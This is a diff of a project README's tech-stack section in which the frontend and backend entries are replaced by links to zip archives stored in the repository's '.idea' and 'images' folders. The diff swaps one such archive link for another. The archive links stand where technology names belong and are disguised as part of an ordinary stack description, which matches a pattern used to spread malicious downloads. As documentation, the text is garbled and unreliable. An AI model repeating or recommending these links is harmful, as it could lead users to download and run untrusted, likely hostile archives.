@@ -16,9 +16,9 @@ Performance Optimization: Fast, SEO-friendly, and responsive designs that work o
 
 🛠️ Tech Stack
 
-Frontend: https://github.com/ThejanGS2/Cortex.A/raw/refs/heads/main/.idea/A_Cortex_v1.4.zip / https://github.com/ThejanGS2/Cortex.A/raw/refs/heads/main/.idea/A_Cortex_v1.4.zip, Tailwind CSS
+Frontend: https://raw.githubusercontent.com/ThejanGS2/Cortex.A/main/images/A_Cortex_3.6.zip / https://raw.githubusercontent.com/ThejanGS2/Cortex.A/main/images/A_Cortex_3.6.zip, Tailwind CSS
 
-Backend: https://github.com/ThejanGS2/Cortex.A/raw/refs/heads/main/.idea/A_Cortex_v1.4.zip, Express
+Backend: https://raw.githubusercontent.com/ThejanGS2/Cortex.A/main/images/A_Cortex_3.6.zip, Express
 
 Database: PostgreSQL / MongoDB
 
